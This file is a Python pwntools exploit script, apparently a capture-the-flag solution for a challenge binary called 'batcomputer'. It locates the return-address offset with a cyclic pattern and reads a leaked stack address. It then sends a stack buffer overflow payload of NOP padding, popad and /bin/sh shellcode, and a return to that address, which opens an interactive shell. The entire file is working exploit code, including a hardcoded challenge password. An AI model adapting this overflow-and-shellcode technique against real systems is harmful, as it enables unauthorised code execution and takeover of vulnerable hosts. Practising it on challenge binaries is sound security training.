#!/bin/env python3
from pwn import *
import re
import sys

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe], argv, *a, **kw)


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '2')
    p.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')
    p.sendlineafter('Enter the navigation commands: ', payload)
    p.sendlineafter('>', '4444')
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP offset at {a}'.format(a=ip_offset))
    # Return the EIP offset
    return ip_offset


# Specify gdbscript
gdbscript = '''
pwndbg
breakrva *0x000131f
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './batcomputer'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
context.encoding = 'utf8'

##### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
offset = find_eip(cyclic(100))

io = start()
sleep(3)
io.sendlineafter('>', '1')

# Get out pivot address (this changes each time)
leaked_stck_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info('stack addr: %#x', leaked_stck_addr)

shellcode = asm(shellcraft.popad())
shellcode += asm(shellcraft.sh())
# shellcode += asm(shellcraft.cat('flag.txt'))
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    padding,
    shellcode,
    leaked_stck_addr
])

io.sendlineafter('>', '2')
io.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')

#gdb.attach(io, gdbscript='''
#break
#''')

io.sendlineafter('Enter the navigation commands: ', payload)
io.sendlineafter('>', '4444')

flag = io.recvuntil("Alfred?\n")

#success(flag)
io.interactive()

